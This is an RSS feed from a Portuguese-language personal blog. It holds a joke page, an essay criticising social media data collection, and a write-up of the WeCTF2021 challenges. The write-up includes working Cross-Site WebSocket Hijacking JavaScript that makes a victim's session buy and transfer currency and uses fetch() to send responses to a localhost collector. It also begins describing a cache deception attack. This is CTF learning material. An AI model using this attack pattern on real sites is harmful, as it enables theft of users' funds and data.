<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blog do Dan</title><link>https://dandeeccastro.github.io/</link><description>Recent content on Blog do Dan</description><generator>Hugo -- gohugo.io</generator><language>pt-br</language><lastBuildDate>Mon, 15 Nov 2021 23:20:07 -0300</lastBuildDate><atom:link href="https://dandeeccastro.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Security</title><link>https://dandeeccastro.github.io/security/</link><pubDate>Wed, 09 Feb 2022 12:35:22 -0300</pubDate><guid>https://dandeeccastro.github.io/security/</guid><description>Você não deveria estar aqui Hey, se você chegou aqui, das duas uma: ou você deu sorte ou procurou esse cantinho lendo o código fonte do site ou fazendo algum tipo de fuzzing. Independente de qual seja, não era pra você estar aqui! Não porque aqui era para ter alguma coisa interessante, longe disso, mas porque eu uso esse canto para fazer alguns experimentos de segurança.
Qualquer CTF ou coisa parecida que eu estiver fazendo, eu vou fazer por aqui, e vou usar isso como um &amp;ldquo;server https&amp;rdquo; com certificado e tal, então ficar aqui provavelmente significa ser pwnado, e você certamente não quer isso.</description><content>&lt;h1 id="você-não-deveria-estar-aqui">Você não deveria estar aqui&lt;/h1>
&lt;p>Hey, se você chegou aqui, das duas uma: ou você deu sorte ou procurou esse cantinho lendo o código fonte do site ou fazendo algum tipo de fuzzing. Independente de qual seja, não era pra você estar aqui! Não porque aqui era para ter alguma coisa interessante, longe disso, mas porque eu uso esse canto para fazer alguns experimentos de segurança.&lt;/p>
&lt;p>Qualquer CTF ou coisa parecida que eu estiver fazendo, eu vou fazer por aqui, e vou usar isso como um &amp;ldquo;server https&amp;rdquo; com certificado e tal, então ficar aqui provavelmente significa ser pwnado, e você certamente não quer isso.&lt;/p>
&lt;p>É sério. Não tem nada aqui. Se quiser sair, a &lt;a href="https://dandeeccastro.github.io/" title="Home">porta tá aqui&lt;/a>&lt;/p>
&lt;p>Tipo, sério mesmo.&lt;/p>
&lt;p>Papo reto.&lt;/p>
&lt;p>Confia.&lt;/p></content></item><item><title>A internet é o novo parquinho</title><link>https://dandeeccastro.github.io/posts/internet-e-o-novo-parquinho/</link><pubDate>Mon, 15 Nov 2021 23:20:07 -0300</pubDate><guid>https://dandeeccastro.github.io/posts/internet-e-o-novo-parquinho/</guid><description>Uma imagem em palavras Por mais que a imagem sépia escondesse as reais cores do local, tudo dava a entender que era mais um dia de sol em um bairro qualquer do Rio de Janeiro. Talvez fosse sábado ou domingo, pois as ruas estavam populadas não só por crianças correndo e brincando, mas adultos em espreguiçadeiras também, que alternavam entre assistir seus filhos e ler as notícias no jornal. Alguns conversavam animadamente com seus vizinhos, outros só apreciavam o breve momento de paz que aquela semana os proporcionara.</description><content>&lt;h1 id="uma-imagem-em-palavras">Uma imagem em palavras&lt;/h1>
&lt;p>Por mais que a imagem sépia escondesse as reais cores do local, tudo dava a entender que era mais um dia de sol em um bairro qualquer do Rio de Janeiro. Talvez fosse sábado ou domingo, pois as ruas estavam populadas não só por crianças correndo e brincando, mas adultos em espreguiçadeiras também, que alternavam entre assistir seus filhos e ler as notícias no jornal. Alguns conversavam animadamente com seus vizinhos, outros só apreciavam o breve momento de paz que aquela semana os proporcionara.&lt;/p>
&lt;p>Esse cenário pode parecer algo que eu inventei, mas foi, um dia, o nosso Rio de Janeiro. Por mais que eu tenha perdido a imagem que originou esse post, ela não sai da minha cabeça. Parece tão distante. Afinal, com a constante urbanização e concomitante digitalização da sociedade, espaços sociais, como uma rua numa tarde de domingo ou um parque em um dia ensolarado, estão lenta e gradualmente sendo substituídos por espaços digitais.&lt;/p>
&lt;p>Não se vê gente puxando cadeiras para conversar com os vizinhos nos corredores de um apartamento. Parques se encontram em situação de abandono, tanto pelo poder público quanto pelo próprio público que o frequentaria. Lugares reais estão sendo substituídos por sistemas que tentam emular a experiência de estar lá. Aquela coisa que você ama fazer provavelmente já tem um subreddit ou grupo do Facebook dedicado.&lt;/p>
&lt;p>Isso tem seus pros: é mais fácil encontrar pessoas e temas pelos quais você se identifica, e por meio da internet você pode manter o contato com essa gente sem ter que morar perto de ninguém. Identificação é a chave aqui: se o meio que você está é hostil às ideias que você cultiva, a internet pode propiciar um novo meio, para que você encontre similares e não se sinta mais uma ovelha negra. Essa transmissão de ideias cultivou subculturas, como a comunidade de speedrunning, e foi capaz de propiciar movimentos sociais e políticos, como a própria Primavera Árabe.&lt;/p>
&lt;p>Mas, ainda que eu seja jovem, minha velha alma não me permite enaltecer os prós. Especialmente quando os contras falam tão alto.&lt;/p>
&lt;h1 id="os-contras">Os Contras&lt;/h1>
&lt;h2 id="o-quanto-vale-o-seu-tempo">O quanto vale o seu tempo?&lt;/h2>
&lt;p>Não é novidade para ninguém, e o cenário político atual serve de prova viva para o argumento: as redes sociais, do jeito que funcionam agora, estão criando bolhas socioculturais, limitando a capacidade de argumentação dos seus integrantes e segmentando-os para que não tenham seus pontos de vista confrontados. Diferentemente de uma rua de domingo, onde você não pode escolher quais as opiniões do vizinho que está na espreguiçadeira ao lado, redes sociais como Facebook e Twitter querem que você tenha uma experiência agradável enquanto estiver em seu &lt;em>feed&lt;/em>, permitindo que você praticamente escolha quais vizinhos vão estar na rua.&lt;/p>
&lt;p>Com isso, vocẽ não precisa ser confrontado com opiniões que venham a contestar seus pontos de vista e o jeito que você enxerga o mundo. Mas isso, por mais que pareça um pró, é também um contra: por meio do confronto entre ideias é que novas teorias e jeitos de pensar mais robustos e consolidados são criados. Pensar é, em si, um exercício, que, assim como um exercício físico, é incômodo. O fortalecimento da mente, assim como o do corpo, é feito botando ele à teste e em situações adversas, para que possa ser estressado e desgastado, a fim de que ele saia da situação mais forte e capaz.&lt;/p>
&lt;p>Mas a sua rede social favorita não quer que você passe por estresse na plataforma dela. A experiência tem que ser agradável, prazerosa e, preferencialmente, sem contradições. Com isso, quem sabe inadvertidamente, elas foram desenvolvidas para que você fosse alimentado somente com o que você quer ver, e isso só pode ser feito te mostrando o que não cria estresse mental. O que não te faz pensar, mas te diverte e te conforta com afirmação dos seus pontos de vista.&lt;/p>
&lt;p>Por que eles fazem isso? Tem algum motivo nefasto para que eles manipulem sua visão de mundo? Por mais que escândalos como o da Cambridge Analytica mostrem que eles sabem do efeito que suas bolhas causam (e tem o interesse claro de lucrar com isso), o motivo maior para as recomendações é relativamente simples: eles ganham dinheiro com sua atenção. O tempo que você passa scrollando no seu &lt;em>feed&lt;/em>, seja de Facebook, Instagram, Twitter ou o que for, é tempo que você está sendo exposto para propagandas. Essa exposição te propicia a comprar de certas marcas ou clicar em links promocionais, dando dinheiro para a plataforma.&lt;/p>
&lt;p>Em outras palavras, você dá o seu tempo de vida para uma plataforma que em troca te alimenta com informações duvidosas, memes engraçados e opiniões sem fundamento mas reconfortantes. Essa troca é aceita por muitas pessoas.&lt;/p>
&lt;p>Mas quem sai ganhando?&lt;/p>
&lt;h2 id="o-quanto-vale-você">O quanto vale você?&lt;/h2>
&lt;p>Para fazer um bolo e ganhar dinheiro com isso, você precisa comprar os ingredientes; produzi-lo e vendê-lo por um preço um pouco maior do que custou para fazê-lo. O quanto você vai lucrar em cima desse bolo depende da diferença do preço de venda e o de compra, que, por sua vez, depende do preço dos ingredientes. Quem compra um bolo o faz por vários motivos, mas no geral é porque pretende ter uma experiência prazerosa comendo ele.&lt;/p>
&lt;p>Para fazer uma rede social e ganhar dinheiro com isso, vários ingredientes são necessários. Desenvolvedores; pesquisa de mercado; usuários interessados em utilizar a plataforma; um sistema de propagandas e vários outros que não sou qualificado para dissertar sobre. No entanto, o ativo principal para qualquer rede social, tanto para capturar quanto manter a atenção do usuário, são dados. Tempo que a pessoa vê o post; se comentou; se deu like ou dislike, vários pequenos pedaços de dados de telemetria que, juntos, montam uma imagem de quais são os interesses da pessoa. Por meio da coleta de dados, as redes sociais são capazes de montar uma persona sua a partir do seu uso, e, com isso, descobrir quais posts vão manter você mais tempo olhando para telas, utilizando, interagindo. Basta abrir uma aba anônima em algum site como YouTube e clicar em qualquer vídeo; sua aba de recomendados será populada por conteúdo parecido, que, teoricamente, te fará consumir mais da plataforma.&lt;/p>
&lt;p>É um ativo importantíssimo para redes sociais. Um ingrediente muito valioso. Quanto custa?&lt;/p>
&lt;p>Nada.&lt;/p>
&lt;p>A coleta de dados de uso para telemetria é uma prática comum em grande parte dos serviços digitais, serve de base para algoritmos que fazem grande parte da nossa vida ( como os algoritmos de recomendação ), é responsável pelo lucro de empresas multimilionárias como Facebook e Amazon, mas não custa nada para ser coletado. Você, meu caro leitor, é, dia a dia, sugado de todo possível dado que é possível extrair de ti, num esforço pífio de te manter mais tempo com os olhos na sua tela de preferência. Você é o gado das fazendas digitais, e essa é uma metáfora que eu não uso de forma fútil.&lt;/p>
&lt;p>Voltando para o bolo, você compra ele para comê-lo. Ele serve para você melhorar a sua vida, nem que seja por um breve momento. Podemos dizer o mesmo das redes sociais? Se a tecnologia era para ser uma ferramenta para as pessoas, por que nós que somos o gado? A quem servem as redes sociais?&lt;/p>
&lt;p>A troca entre usuário e plataforma, no modelo de negócio atual que lucra em cima da atenção das pessoas, está completamente desigual. O tanto que as redes sociais nos servem não compensa o que elas servem para seus donos e as marcas que lucram com propagandas. Nós estamos sendo reduzidos a zeros e uns, personificados em modelos matemáticos e divididos por nossas preferências, e em troca o que ganhamos é aquele sentimento de insuficiência, de que se abrirmos a plataforma mais uma vez, talvez algo realmente interessante aconteça.&lt;/p>
&lt;p>E assim, várias pessoas passam porcentagens consideráveis dos seus dias interagindo pelos meios digitais, sendo estudados por máquinas para que fiquem mais tempo. A sociedade começa a se digitalizar, seguindo os termos de uso de terceiros. Como isso tem transformado a gente?&lt;/p>
&lt;h2 id="cada-um-no-seu-canto">Cada um no seu canto&lt;/h2>
&lt;p>Na vida, frequentamos espaços sociais, como trabalho, academia ou praia. Neles, nos encontramos com outras pessoas, e por meio da convivência nesse espaço, passamos a conhecê-las e, quem sabe, fazer uma amizade. Por mais que o seu perfil seja introvertido, em algum momento na sua vida você teve um sentimento de familiaridade com alguém que frequenta os mesmos lugares que você. Humanos são seres sociais, é mais do que natural que queiramos fazer amigos quando estamos num ambiente social. E, com a mudança para o digital, não seria diferente.&lt;/p>
&lt;p>É importante deixar claro que &lt;em>o meio nos diz como que as interações sociais vão acontecer&lt;/em>. É considerado rude falar alto numa biblioteca. É comum que duas pessoas conversem quando seus cachorros se entrosam durante uma caminhada matinal. Pessoas trabalhando para um mesmo objetivo tendem a comunicar mais, como no trabalho ou em salas de aula.&lt;/p>
&lt;p>Sendo assim, como que o meio digital induz a comunicação entre seus habitantes? Como dito antes, por causa da fuga do estresse, é vital para as redes sociais a existência de espaços com pessoas de opiniões similares. Onde há muitas pessoas iguais, a repetição de tópicos e opiniões prevalesce, e isso gera câmaras de eco, onde &amp;ldquo;ganha quem fala mais alto&amp;rdquo;. Com isso, surge o conceito de &lt;strong>viralidade&lt;/strong>. A opinião mais repetida, ou a voz mais ecoada, consegue reverberar para todos que frequentam o meio e atingir muita gente, fazendo com que aquilo que ecôou se torne um micro fenômeno, ou seja, viral. Beneficiado por funcionalidades de engajamento como likes e compartilhamentos, sua consolidação moldou o modo de comunicação do meio.&lt;/p>
&lt;p>No meio digital, diálogos não engajam, eles podem levantar sentimentos ruins para os usuários. O viral é efêmero; fútil e raso. Um meme engraçado que dura alguns meses, uma piada bem colocada, uma opinião que soa legal, uma música que estoura sem motivo aparente. Algo simples de ser reproduzido e copiado por outras pessoas. Desde que seja acreditável ou que reforçe uma crença sua, pode ser viral. Como os terraplanistas provaram, não precisa nem estar certo. Basta se alimentar de questionamentos simples da vida e retornar respostas igualmente simples que haverá engajamento.&lt;/p>
&lt;p>O problema mora no fato de que isso é reflexivo: assim como o real está influenciando a interação digital, o digital afeta o real. Opiniões rasas estão sendo compartilhadas fora dos grupos, e o método de discussão da câmara de eco e de fatos simplórios prevalescem, chegando a extremos onde, mesmo com as provas da contraditoriedade de um argumento nas mãos, as pessoas continuarão a defendê-lo. Novamente cito os terraplanistas, que fizeram um experimento para provar sua teoria, mas conseguiram provar sua curvatura. Verdades são vendidas na internet como a pílula vermelha do Matrix (que ironicamente é o nome de outra comunidade extremista online, quem diria).&lt;/p>
&lt;p>Essas verdades inquestionáveis levam à crença de que quem não vê o que você vê tem que ser o maior dos idiotas. Não tem motivo nenhum para que você se relacione com alguém que enxerga o mundo &lt;em>desse&lt;/em> jeito, então você se isola. E de repente as comunidades digitais, tentando dar luz às coisas que nos unem, deixou evidente o que nos divide, e, com cada um no seu canto, entramos na era da solidão.&lt;/p>
&lt;h1 id="daqui-para-aonde">Daqui para aonde?&lt;/h1>
&lt;p>A natureza de relações mediadas por redes sociais, com suas câmaras de eco e subculturas extremamente desconectadas umas das outras, criou uma geração de indivíduos que vêem o mundo com uma lente meticulosamente personalizada, que mostra somente sua própria definição de correto. Essas pessoas estão se acostumando mais e mais a ver somente o perfeito, e encontrar suplementos digitais a necessidades reais do ser humano. O tempo passado consumindo o digital faz com que o que era pra ser complementar passa a ser o todo, e assim surge uma sociedade dividida, que não mais reconhece no outro as semelhanças por só conseguir enxergar as diferenças.&lt;/p>
&lt;p>As empresas que possuem essas redes sociais não tem preocupação clara com o efeito social causado pelo seu produto e seguem investindo dinheiro e recursos para manter usuários interagindo e se conectando da maneira mais lucrativa possível. Ao que os registros aparentam, os esforços alocados para o impacto social de suas plataformas são ou descartados ou meramente mencionados em coletivas de emprensa para manter investidores calmos e investindo. E nós seguimos como estamos. Usuários de um sistema que nos usa.&lt;/p>
&lt;p>E aí? O que a gente faz?&lt;/p>
&lt;h2 id="pense">Pense&lt;/h2>
&lt;p>Como disse antes, tecnologia é uma ferramenta. Ela serve para facilitar trabalhos complicados e, no geral, para melhorar a qualidade de vida das pessoas. Do jeito que as coisas estão, não somos nós que estamos usando essas ferramentas: somos o gado, a fonte do lucro de terceiros que só querem enriquecer mais. Não precisa ser assim. Como usuário de redes que usam você, saiba quando você está usando a ferramenta e quando você estiver sendo usado por ela. Tenha um propósito quando for abrir Twitter, Instagram ou o que for, não abra só para saciar sua vontade de ter algo pra ver. Valorize seu próprio tempo: nenhum segundo dessa vida passa duas vezes.&lt;/p>
&lt;h2 id="defenda-se">Defenda-se&lt;/h2>
&lt;p>A luta pela privacidade não é só de pessoas que tem algo a esconder, é de todos. Os seus dados estão a leilão nesse momento, e os compradores não tem seus melhores interesses em mente. A regulamentação da coleta de dados de telemetria vai demorar, então procure conscientizar-se sobre ela. Por meio desse texto eu só introduzi o assunto, não sou especialista. Sou só alguém que cresceu numa rua onde todos se conheciam, para agora ver que os que estão do nosso lado nem se vêem mais como vizinhos. Uma pessoa preocupada e que não quer ficar calada.&lt;/p>
&lt;p>Valorize seus dados. Não é porque você não tem nada a esconder que significa que você não tem nada que terceiros desejam. Procure por serviços que não coletam telemetria ou cujos dados coletados sejam o mínimo necessário para a manutenção do sistema. Evite sistemas de recomendação. Bloqueie propagandas. Faça com que os serviços que usa percebam que o que estão fazendo não é mais desejado.&lt;/p>
&lt;h2 id="reinvente">Reinvente&lt;/h2>
&lt;p>Uma rua de um bairro do Rio de Janeiro, com espreguiçadeiras, crianças correndo e um sol de verão. Jornal na mão, ou quem sabe uma cerveja no copo. Jogando papo fora com alguém enquanto aproveita o final de semana.&lt;/p>
&lt;p>Essa imagem precisa ser antiga? O que ela &lt;em>representa&lt;/em> não precisa morar no passado. Ironicamente, num mundo de conectividade, o que falta é o que essa imagem encapsula: conexão. Comunidade, não por termos todos pontos em comum entre nós, mas por procurarmos pontos em comum no outro. Por focar no que nos une, e não no que nos separa. Com ou sem tecnologia, só vamos chegar em algum lugar enquanto estivermos juntos.&lt;/p>
&lt;p>Eu não vou pagar de mãe aqui e falar &amp;ldquo;saia desse telefone e vai viver a vida, moleque&amp;rdquo;. Eu vou fazer uma melhor.&lt;/p>
&lt;p>&amp;ldquo;Traz o teu telefone junto, só não deixa de viver a vida&amp;rdquo;.&lt;/p></content></item><item><title>WriteUp WeCTF2021</title><link>https://dandeeccastro.github.io/posts/writeup-wectf-2021/</link><pubDate>Sat, 03 Jul 2021 05:35:07 -0300</pubDate><guid>https://dandeeccastro.github.io/posts/writeup-wectf-2021/</guid><description>Quando comecei a estudar segurança da computação, a imagem que vinha na minha cabeça era principalmente a parte de pentesting web. O motivo é simples: já tive dois anos de experiência trabalhando com desenvolvimento web em plataformas como Laravel e Angular, e nesse período eu cheguei a descobrir uma injeção de código em um dos produtos que estava desenvolvendo. Consequentemente consegui mais uma sprint, mas desde então fiquei muito interessado pela área.</description><content>&lt;p>Quando comecei a estudar segurança da computação, a imagem que vinha na minha cabeça era principalmente a parte de pentesting web. O motivo é simples: já tive dois anos de experiência trabalhando com desenvolvimento web em plataformas como Laravel e Angular, e nesse período eu cheguei a descobrir uma injeção de código em um dos produtos que estava desenvolvendo. Consequentemente consegui mais uma sprint, mas desde então fiquei muito interessado pela área.&lt;/p>
&lt;p>Agora em 2021, nas férias da faculdade, decidi me aplicar um pouco mais na área de segurança e escolhi um CTF para fazer. Um dos sites no qual você pode acessar CTFs antigos é o &lt;a href="https://ctftime.org">CTFTime&lt;/a>, onde eu encontrei o WeCTF2021. Como os desafios estão &lt;a href="https://github.com/wectf/2021">disponíveis no GitHub deles&lt;/a> em forma de containers Docker, é possível emular o ambiente do CTF original (com alguns cuidados, que falarei em breve) e botar a mão na massa.&lt;/p>
&lt;h1 id="instalação-e-configuração-do-ambiente">Instalação e Configuração do Ambiente&lt;/h1>
&lt;p>Pra quem está lendo isso e quer fazer também, segue aqui o que você vai precisar para emular o ambiente da melhor forma possível.&lt;/p>
&lt;ul>
&lt;li>Os desafios estão disponíveis em containers Docker que podem ser gerados com o &lt;em>Docker Compose&lt;/em>, então tenha certeza que ele está instalado!&lt;/li>
&lt;li>Alguns desafios envolvem vulnerabilidades que precisam de um &amp;ldquo;ambiente de vítima&amp;rdquo;. No código fonte do repositório, você vai encontrar uma pasta chamada &lt;code>uv_worker&lt;/code>, na qual existem arquivos Python com o nome de desafios que são dessa categoria. Para eles você vai precisar de &lt;em>Python&lt;/em> instalado, junto com &lt;em>Selenium&lt;/em>, para que você possa emular o navegador da vítima&lt;/li>
&lt;li>Fora isso eu recomendo algumas utilidades como &lt;em>Burp Suite&lt;/em>, mas mais por conveniência, porque as ferramentas de desenvolvedor do navegador já são um adianto muito grande&lt;/li>
&lt;/ul>
&lt;p>Tendo isso instalado, basta clonar o repositório com &lt;code>git clone https://github.com/wectf/2021&lt;/code>, abrir um terminal dentro da pasta clonada e criar os containers com &lt;code>docker-compose up&lt;/code>. Não recomendo rodar os containers usando a flag -d, que joga os processos em background, porque alguns containers podem ter problemas para serem rodados, como aconteceu comigo. Sem a flag você pode ver quais containers deram problema e quais erros aconteceram.&lt;/p>
&lt;p>Outra recomendação: só tenha rodando os containers que você for usar para cada desafio (a não ser que o seu consiga rodar, porque o meu chegou no 100% de uso de CPU rapidinho)! Depois de tiver todos os containers criados, basta pará-los com &lt;code>docker compose kill&lt;/code>, escolher qual quer você quer fazer com &lt;code>docker container ls -a&lt;/code> e iniciá-lo com &lt;code>docker start &amp;lt;container_id&amp;gt;&lt;/code>&lt;/p>
&lt;h1 id="enfim-o-writeup">Enfim, o WriteUp&lt;/h1>
&lt;h2 id="coin">Coin&lt;/h2>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/ethexchange.png" alt="Tela Inicial do Desafio">&lt;/p>
&lt;p>Depois de iniciado o container, você terá acesso a um maravilhoso site de trading de Eth! Ao fazer login, verá que você é o único lá além de você é um colega com o nome TheBoss com 1M de dólares na conta.Objetivo: roubar o dinheiro e sair correndo!&lt;/p>
&lt;p>Analisando tanto a comunicação entre cliente e servidor quanto o código fonte do site, verá que, uma vez conectado, a comunicação com a exchange é feita via WebSocket. O protocolo funciona de uma forma relativamente simples: primeiro um handshake é feito entre cliente e servidor, e se o handshake for aceito, será feita a troca de protocolo e a conexão WebSocket é estabelecida.&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/handshake.png" alt="Handshake do WebSocket">&lt;/p>
&lt;p>Essa conexão WebSocket está suscetível a um ataque: se o handshake não usa qualquer tipo de token de sessão como um CSRF token, então qualquer site malicioso que for aberto por uma vítima pode fingir ser a vítima abrindo essa conexão. Esse é o Cross Site WebSocket Hijacking, ou CSWBH, e essa é a vulnerabilidade desse desafio.&lt;/p>
&lt;p>O código revela que existem cinco operações que podem ser feitas pela api da exchange: ping, que pega informações básicas do site para mostrar, init, que faz o login ou cadastro; buy, que compra Eth; sell, que vende Eth, e por fim transfer, que transfere Eth de um usuário para o outro. Tendo isso em mãos, basta montar um pequeno webserver em Python com o site malicioso que criará a conexão e fará as transferências para nossa conta! Sendo isso, fiz um site simples com uma tag script com o código abaixo.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">WebSocket&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ws://localhost:4001&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;ethexchange-api&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">transfer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">JSON&lt;/span>.&lt;span style="color:#a6e22e">stringify&lt;/span>({
&lt;span style="color:#e6db74">&amp;#34;type&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#e6db74">&amp;#34;transfer&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;content&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#75715e">// quantidade humilde para teste
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;to_token&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#e6db74">&amp;#34;meu_token&amp;#34;&lt;/span> &lt;span style="color:#75715e">// aqui entraria o token do meu user
&lt;/span>&lt;span style="color:#75715e">&lt;/span> }
});
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">event&lt;/span>) {
&lt;span style="color:#75715e">// Vários para garantir
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">transfer&lt;/span>);
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">transfer&lt;/span>);
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">transfer&lt;/span>);
}
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">event&lt;/span>) {
&lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;http://localhost:8000/?response=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">event&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>O código fará várias tentativas de transfer de Eth para a minha conta e para cada resposta do servidor, enviará a mensagem para o localhost porta 8000 em forma de parâmetro de requisição e ela poderá ser vista na lista de requests do servidor Python aberto com &lt;code>python -m http.server&lt;/code>. Com isso, conseguimos a resposta abaixo:&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/exploit-parte-1.png" alt="Primeira tentativa de exploit">&lt;/p>
&lt;p>Obtemos um JSON dizendo foram feitas três transferências de 0 Eth. Isso nos mostra que a vítima em questão não possui Eth na conta, somente dólares. Não seja por isso: podemos também fazer com que ele compre Eth antes de transferir! Basta adicionar compra de Eth no payload e a flag é nossa!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* Mantém a mesma coisa que antes, mas agora tem isso */&lt;/span>
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">buy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">JSON&lt;/span>.&lt;span style="color:#a6e22e">stringify&lt;/span>({
&lt;span style="color:#e6db74">&amp;#34;type&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#e6db74">&amp;#34;buy&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;content&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#e6db74">&amp;#34;7000&amp;#34;&lt;/span>,
}
});
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">event&lt;/span>) {
&lt;span style="color:#75715e">// Agora com buy antes
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">buy&lt;/span>);
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">buy&lt;/span>);
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">buy&lt;/span>);
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">transfer&lt;/span>);
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">transfer&lt;/span>);
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">transfer&lt;/span>);
}
&lt;span style="color:#a6e22e">socket&lt;/span>.&lt;span style="color:#a6e22e">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">event&lt;/span>) {
&lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;http://localhost:8000/?response=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">event&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/payload-parte-2.png" alt="Transferência bem sucedida no Terminal">&lt;/p>
&lt;p>Agora as requisições mostram que dinheiro foi transferido para nossa conta, e se olharmos para nosso saldo&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/conta-com-dinheiro.png" alt="Conta com Dinheiro">&lt;/p>
&lt;p>Tendo mais de 5 mil na sua conta, a flag será enviada para você na comunicação WebSocket depois de você enviar um ping.&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/coin-flag.png" alt="Flag do Desafio">&lt;/p>
&lt;h2 id="cache">Cache&lt;/h2>
&lt;p>Nesse desafio, temos um site simples com duas páginas: &lt;code>index&lt;/code> e &lt;code>flag&lt;/code>. Na página &lt;code>index&lt;/code>, recebemos um texto simples dizendo que não tem nada lá, mas para conferir o &lt;code>flag&lt;/code>. Em &lt;code>flag&lt;/code>, vemos que não podemos acessar a não ser que sejamos admin. Na pasta &lt;code>uv_worker&lt;/code> vemos que existe um arquivo Python do desafio, então é outro desafio no qual temos que enviar links maliciosos para a vítima&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/codigo-fonte-cache.png" alt="Código Fonte do Desafio">&lt;/p>
&lt;p>Dando uma olhada no código fonte da middleware que faz a autenticação que bloqueia a gente, vemos uma implementação de caching curiosa: se a página a ser acessada tiver sufixo de JS, HTML ou CSS, ela será cacheada e disponível para acesso mais rapidamente que as outras.&lt;/p>
&lt;p>Isso é feito para que arquivos estáticos, os que todo usuário precisa ter acesso, estejam disponíveis rapidamente. Mas esse cache foi implementado de uma forma insegura, que permite um ataque de &lt;em>cache deception&lt;/em>: a manipulação do sistema de cache de forma a cachear informações confidenciais, como por exemplo uma página de admin&amp;hellip;&lt;/p>
